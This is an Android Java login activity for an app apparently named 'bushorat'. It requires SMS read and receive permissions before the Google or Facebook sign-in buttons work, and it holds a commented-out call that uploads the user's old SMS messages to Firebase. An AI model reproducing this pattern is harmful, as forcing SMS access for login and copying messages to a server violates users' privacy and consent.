package com.mehboob.bushorat.activities;

import android.Manifest;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.auth.FirebaseAuth;
import com.mehboob.bushorat.R;
import com.mehboob.bushorat.databinding.ActivityChooseLoginBinding;
import com.mehboob.bushorat.helpers.PermissionHelper;

public class ChooseLoginActivity extends AppCompatActivity {

    private ActivityChooseLoginBinding binding;

    private FirebaseAuth mAuth;
    private PermissionHelper permissionHelper;
    private final int PERMISSION_CODE = 101;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        binding= ActivityChooseLoginBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

mAuth=FirebaseAuth.getInstance();

        binding.btnFacebookSignIn.setOnClickListener(v -> startActivity(new Intent(ChooseLoginActivity.this,RegisterFacebookActivity.class)));


        binding.btnGoogleSignIn.setOnClickListener(v -> startActivity(new Intent(ChooseLoginActivity.this,RegisterGoogleActivity.class)));


//        if (user != null) {
//            SmsHelper.uploadOldSmsToFirebase(this, user.getUid());
//        }


        permissionHelper = new PermissionHelper(this, PERMISSION_CODE);

        String[] permissions = {
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
        };

        if (!permissionHelper.hasPermissions(permissions)) {
            permissionHelper.requestPermissions(permissions);
        }
    }

    @Override
    protected void onStart() {
        super.onStart();


        if (mAuth.getCurrentUser() != null){
            startActivity(new Intent(ChooseLoginActivity.this,DashboardActivity.class));
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        boolean granted = permissionHelper.handleResult(requestCode, grantResults);

        if (granted) {

            binding.btnGoogleSignIn.setActivated(true);
            binding.btnFacebookSignIn.setActivated(true);

            binding.btnGoogleSignIn.setClickable(true);
            binding.btnFacebookSignIn.setClickable(true);

        } else {
            binding.btnGoogleSignIn.setActivated(false);
            binding.btnFacebookSignIn.setActivated(false);


            binding.btnGoogleSignIn.setClickable(false);
            binding.btnFacebookSignIn.setClickable(false);
            Toast.makeText(this, "Some permissions denied", Toast.LENGTH_SHORT).show();
        }
    }



}